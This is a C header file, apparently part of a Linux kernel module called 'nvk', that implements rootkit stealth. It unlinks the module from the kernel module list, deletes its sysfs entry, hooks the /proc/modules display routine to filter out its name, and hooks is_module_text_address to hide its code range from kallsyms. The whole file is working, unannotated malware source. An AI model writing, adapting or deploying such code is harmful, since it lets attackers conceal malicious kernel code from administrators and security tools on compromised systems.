/* SPDX-License-Identifier: GPL-2.0 */
#ifndef NVK_HIDE_H
#define NVK_HIDE_H

#include <linux/types.h>
#include <linux/compiler.h>
#include <linux/list.h>
#include <linux/kallsyms.h>
#include <nvkmod_version.h>
#include <nvk_hook.h>

typedef void (*nvk_mutex_lock_fn)(void *);
typedef void (*nvk_mutex_unlock_fn)(void *);
typedef void *(*nvk_find_module_fn)(const char *name);
typedef void  (*nvk_kobject_del_fn)(void *kobj);
typedef void  (*nvk_kobject_put_fn)(void *kobj);

struct nvk_hide_state {
	struct list_head *saved_next;
	struct list_head *saved_prev;
	int               hidden;
	struct nvk_hook   find_module_hook;
	nvk_find_module_fn orig_find_module;
	const char       *module_name;
	int               sysfs_removed;
	int               kallsyms_filtered;
	void             *saved_kobj;
	struct nvk_hook   seq_show_hook;
	int               seq_show_hooked;
};

static nvk_mutex_lock_fn   _nvk_hide_mutex_lock;
static nvk_mutex_unlock_fn _nvk_hide_mutex_unlock;
static void               *_nvk_module_mutex;
static nvk_kobject_del_fn  _nvk_kobject_del;
static nvk_kobject_put_fn  _nvk_kobject_put;
static int                 _nvk_hide_inited;

static int nvk_hide_init(void)
{
	if (_nvk_hide_inited) return 0;

	_nvk_hide_mutex_lock =
		(nvk_mutex_lock_fn)NVK_LOOKUP("mutex_lock");
	_nvk_hide_mutex_unlock =
		(nvk_mutex_unlock_fn)NVK_LOOKUP("mutex_unlock");
	_nvk_module_mutex = (void *)NVK_LOOKUP("module_mutex");
	_nvk_kobject_del =
		(nvk_kobject_del_fn)NVK_LOOKUP("kobject_del");
	_nvk_kobject_put =
		(nvk_kobject_put_fn)NVK_LOOKUP("kobject_put");

	_nvk_hide_inited = 1;
	return 0;
}

static __always_inline struct list_head *
_nvk_get_mod_list(struct nvk_this_module *mod)
{
	return (struct list_head *)((char *)mod + NVK_OFF_LIST);
}

static void nvk_mod_hide(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our, *n, *p;

	if (state->hidden) return;

	our = _nvk_get_mod_list(mod);
	n = our->next;
	p = our->prev;

	state->saved_next = n;
	state->saved_prev = p;

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	p->next = n;
	n->prev = p;
	our->next = our;
	our->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 1;
}

static void nvk_mod_show(struct nvk_hide_state *state,
			 struct nvk_this_module *mod)
{
	struct list_head *our;

	if (!state->hidden) return;

	our = _nvk_get_mod_list(mod);

	if (_nvk_hide_mutex_lock && _nvk_module_mutex)
		_nvk_hide_mutex_lock(_nvk_module_mutex);

	our->next = state->saved_next;
	our->prev = state->saved_prev;
	state->saved_prev->next = our;
	state->saved_next->prev = our;

	if (_nvk_hide_mutex_unlock && _nvk_module_mutex)
		_nvk_hide_mutex_unlock(_nvk_module_mutex);

	state->hidden = 0;
}

static __always_inline int nvk_mod_is_hidden(struct nvk_hide_state *state)
{
	return state->hidden;
}

static void nvk_mod_sysfs_remove(struct nvk_hide_state *state,
				 struct nvk_this_module *mod)
{
	void *mkobj = (void *)0;

	if (state->sysfs_removed) return;

	unsigned long kobj_off = NVK_OFF_NAME + 64;
	unsigned char *base = (unsigned char *)mod;
	unsigned long i;
	for (i = kobj_off; i < kobj_off + 256; i += 8) {
		unsigned long v = *(unsigned long *)(base + i);
		if (v > 0xFFFF000000000000UL && v < 0xFFFFFFFFFFFFF000UL) {
			unsigned long *pp = (unsigned long *)v;
			if (*pp > 0xFFFF000000000000UL) {
				mkobj = (void *)v;
				break;
			}
		}
	}

	if (!mkobj) return;

	if (_nvk_kobject_del) {
		_nvk_kobject_del(mkobj);
		state->saved_kobj = mkobj;
		state->sysfs_removed = 1;
	}
}

typedef int (*nvk_mod_seq_show_fn)(void *seq, void *v);
static nvk_mod_seq_show_fn _nvk_orig_mod_seq_show;
static const char *_nvk_hide_target_name;

static int _nvk_str_starts_with(const char *str, const char *prefix)
{
	while (*prefix) {
		if (*str != *prefix) return 0;
		str++;
		prefix++;
	}
	return 1;
}

static int _nvk_mod_seq_show_filter(void *seq, void *v)
{
	if (!_nvk_orig_mod_seq_show)
		return 0;

	if (v && _nvk_hide_target_name) {
		unsigned long list_addr = (unsigned long)v;
		unsigned long mod_base = list_addr - NVK_OFF_LIST;
		const char *name = (const char *)(mod_base + NVK_OFF_NAME);

		if (_nvk_str_starts_with(name, _nvk_hide_target_name))
			return 0;
	}

	return _nvk_orig_mod_seq_show(seq, v);
}

static int nvk_mod_proc_filter(struct nvk_hide_state *state,
			       const char *module_name)
{
	void *target;

	if (state->seq_show_hooked) return 0;

	target = NVK_LOOKUP("modules_seq_show");
	if (!target)
		target = NVK_LOOKUP("m_show");
	if (!target) return -1;

	state->module_name = module_name;
	_nvk_hide_target_name = module_name;

	int ret = nvk_hook_install(&state->seq_show_hook, target,
				   (void *)_nvk_mod_seq_show_filter,
				   (void **)&_nvk_orig_mod_seq_show);
	if (ret) return ret;

	state->seq_show_hooked = 1;
	return 0;
}

typedef int (*nvk_mod_addr_fn)(unsigned long addr);
static nvk_mod_addr_fn _nvk_orig_mod_text_addr;
static struct nvk_hook _nvk_ks_hook;
static int _nvk_ks_hooked;
static unsigned long _nvk_hide_mod_start;
static unsigned long _nvk_hide_mod_end;

static int _nvk_mod_text_addr_filter(unsigned long addr)
{
	if (addr >= _nvk_hide_mod_start && addr < _nvk_hide_mod_end)
		return 0;
	if (_nvk_orig_mod_text_addr)
		return _nvk_orig_mod_text_addr(addr);
	return 0;
}

static int nvk_mod_kallsyms_filter(struct nvk_hide_state *state,
				   const char *module_name)
{
	void *target;

	if (state->kallsyms_filtered) return 0;

	_nvk_hide_target_name = module_name;

	target = NVK_LOOKUP("is_module_text_address");
	if (!target)
		target = NVK_LOOKUP("__module_text_address");
	if (!target) return -1;

	unsigned char *mod_base = (unsigned char *)&__this_module;
	_nvk_hide_mod_start = (unsigned long)mod_base;
	_nvk_hide_mod_end = _nvk_hide_mod_start + NVK_MODULE_SIZE;

	int ret = nvk_hook_install(&_nvk_ks_hook, target,
				   (void *)_nvk_mod_text_addr_filter,
				   (void **)&_nvk_orig_mod_text_addr);
	if (ret) return ret;

	_nvk_ks_hooked = 1;
	state->kallsyms_filtered = 1;
	return 0;
}

static void nvk_mod_full_hide(struct nvk_hide_state *state,
			      struct nvk_this_module *mod,
			      const char *module_name)
{
	nvk_mod_hide(state, mod);

	nvk_mod_sysfs_remove(state, mod);

	nvk_mod_proc_filter(state, module_name);

	nvk_mod_kallsyms_filter(state, module_name);
}

static void _nvk_hide_cleanup(struct nvk_hide_state *state,
			      struct nvk_this_module *mod)
{
	if (state->kallsyms_filtered && _nvk_ks_hooked) {
		nvk_hook_remove(&_nvk_ks_hook);
		_nvk_ks_hooked = 0;
		state->kallsyms_filtered = 0;
	}

	if (state->seq_show_hooked) {
		nvk_hook_remove(&state->seq_show_hook);
		state->seq_show_hooked = 0;
	}

	if (state->find_module_hook.active)
		nvk_hook_remove(&state->find_module_hook);

	if (state->hidden)
		nvk_mod_show(state, mod);
}

#define NVK_HIDE_INIT_STATE { .saved_next = 0, .saved_prev = 0,  \
			      .hidden = 0, .module_name = 0,     \
			      .sysfs_removed = 0,                 \
			      .kallsyms_filtered = 0,             \
			      .saved_kobj = 0,                    \
			      .seq_show_hooked = 0 }

#endif /* NVK_HIDE_H */
